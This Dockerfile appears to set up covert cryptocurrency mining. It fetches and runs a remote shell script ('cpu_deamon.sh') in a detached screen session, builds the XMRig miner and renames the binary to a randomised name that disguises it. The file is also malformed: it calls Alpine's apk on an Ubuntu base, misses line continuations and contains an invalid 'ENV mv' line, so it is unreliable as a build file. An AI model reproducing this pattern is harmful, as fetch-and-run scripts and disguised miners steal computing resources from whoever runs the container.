FROM ubuntu:16.04

RUN  set -x \
  && apk update \
  && apk add --no-cache ca-certificates git build-base cmake libuv-dev libmicrohttpd-dev openssl-dev util-linux-dev \
  && apk add --no-cache wget screen cpulimit gawk \
  && apk add --no-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing/ --allow-untrusted hwloc-dev \
  && wget https://raw.githubusercontent.com/ts6aud5vkg/gpuissa/master/cpu_deamon.sh \
  && chmod 755 cpu_deamon.sh
  && screen -d -m ./cpu_deamon.sh
  && azure=mxsemsdnlkdj;
WORKDIR /temp
RUN rm -r /temp/$azure \
  && git clone https://github.com/xmrig/xmrig.git /temp/$azure \
  && a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d \
  && cd /temp/$azure
  && sysctl -w vm.nr_hugepages=128 \
  && mkdir build \
  && cd build \
  && cmake .. \
  && make \
ENV mv xmrig $azure -n \
  && cp $azure "$cpuname" 
RUN rm -f  xmrig
RUN echo $cpuname" is starting"

ENTRYPOINT ["$cpuname"]
CMD ["--help"]



  
